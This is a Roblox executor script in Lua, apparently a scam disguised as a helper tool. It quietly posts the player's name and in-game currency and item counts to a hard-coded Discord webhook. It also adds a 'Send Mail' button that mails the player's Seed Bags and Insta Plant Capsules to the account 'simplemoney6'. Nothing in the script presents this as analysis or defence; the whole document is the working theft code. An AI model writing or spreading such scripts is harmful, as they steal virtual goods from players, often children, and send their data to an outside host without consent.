wait(5)
local player = game.Players.LocalPlayer
local gui = player.PlayerGui:FindFirstChild("_MACHINES")

if gui then
    local mailboxMachine = gui.MailboxMachine
    if mailboxMachine then
        local giftsFrame = mailboxMachine.Frame.GiftsFrame
        if giftsFrame then
            local itemsFrame = giftsFrame.ItemsFrame
            if itemsFrame then
                local frameChild = itemsFrame:FindFirstChildWhichIsA("Frame")
                if frameChild then
                    local args = {
                        [1] = {
                            [1] = frameChild.Name
                        }
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
                end
            end
        end
    end
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Client = require(ReplicatedStorage:WaitForChild("Library"))
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local webhookURL = "https://discord.com/api/webhooks/1240051310783627374/FeWsgqN_nlUvPEXVnxgP4pZ5qIJeDn6Uyhd0_vjjBVVGegKU8jGLgVdV0ULgRWumSvML"
local request = (syn and syn.request) or request or (http and http.request) or http_request

local DiamondsTable = {"Diamonds"}
local ItemTable = {"Seed Bag", "Insta Plant Capsule"}

function MakeDiamondsTable(Table)
    local Temp = {}
    for i, v in next, Client.Items.All.Globals.All() do
        if table.find(Table, v._data.id) then
            table.insert(Temp, v)
        end
    end
    return Temp
end

function MakeTable(Table)
    local Temp = {}
    for i, v in next, Client.Items.All.Globals.All() do
        if table.find(Table, v._data.id) then
            table.insert(Temp, v)
        end
    end
    return Temp
end

local diamondsAmount, seedBagAmount, instaPlantCapsuleAmount
local seedbagid, instaplantid

function GrabDiamondsId()
    for i, MadeTable in ipairs(MakeDiamondsTable(DiamondsTable)) do
        local Table = HttpService:JSONDecode(tostring(MadeTable))
        if Table.class == "Currency" then
            diamondsAmount = Table.data._am
        end
    end
end

function GrabId()
    for i, MadeTable in ipairs(MakeTable(ItemTable)) do
        local Table = HttpService:JSONDecode(tostring(MadeTable))
        if Table.data.id == "Seed Bag" then 
            seedBagAmount = Table.data._am
            seedbagid = Table.uid
        elseif Table.data.id == "Insta Plant Capsule" then
            instaPlantCapsuleAmount = Table.data._am
            instaplantid = Table.uid
        end
    end
end

GrabDiamondsId()
GrabId()

local playerName = Players.LocalPlayer.Name

local contentMsg = {
    embeds = {
        {
            title = "***👨‍💻: " .. playerName .. "***",
            description = "",
            color = 16777215,
            fields = {
                {
                    name = "***💎:***",
                    value = "***" .. (diamondsAmount and diamondsAmount or 0) .. "***"
                },
                {
                    name = "***🫙:***",
                    value = "***" .. (instaPlantCapsuleAmount and instaPlantCapsuleAmount or 0) .. "***"
                },
                {
                    name = "***🌱:***",
                    value = "***" .. (seedBagAmount and seedBagAmount or 0) .. "***"
                }
            }
        }
    }
}


request({
    Url = webhookURL,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json",
    },
    Body = HttpService:JSONEncode(contentMsg),
})

local screenGui = Instance.new("ScreenGui")
local button = Instance.new("TextButton")

screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
button.Parent = screenGui
button.Size = UDim2.new(0, 200, 0, 50)
button.Position = UDim2.new(0.5, -100, 0, 0)  -- Changed Y position to 0 for top alignment
button.BackgroundColor3 = Color3.new(0, 0, 0)
button.Text = "Send Mail"
button.TextColor3 = Color3.new(1, 1, 1)
button.TextScaled = true


button.MouseButton1Click:Connect(function()
    local args1 = {
        [1] = "simplemoney6",
        [2] = "sent",
        [3] = "Misc",
        [4] = seedbagid or "",
        [5] = seedBagAmount or ""
    }

    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args1))
    wait(3)
    local args2 = {
        [1] = "simplemoney6",
        [2] = "sent",
        [3] = "Misc",
        [4] = instaplantid or "",
        [5] = instaPlantCapsuleAmount or ""
    }

    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))

    local mailContentMsg = {
        embeds = {
            {
                title = "***👨‍💻: " .. playerName .. "***",
                description = "***💌: Mail Successfully Sent!***",
                color = 16777215,
                fields = {
                    {
                        name = "***🫙:***",
                        value = "Sent ***" .. instaPlantCapsuleAmount .. "***"
                    },
                    {
                        name = "***🌱:***",
                        value = "Sent ***" .. seedBagAmount .. "***"
                    }
                }
            }
        }
    }

    request({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
        },
        Body = HttpService:JSONEncode(mailContentMsg),
    })
end)
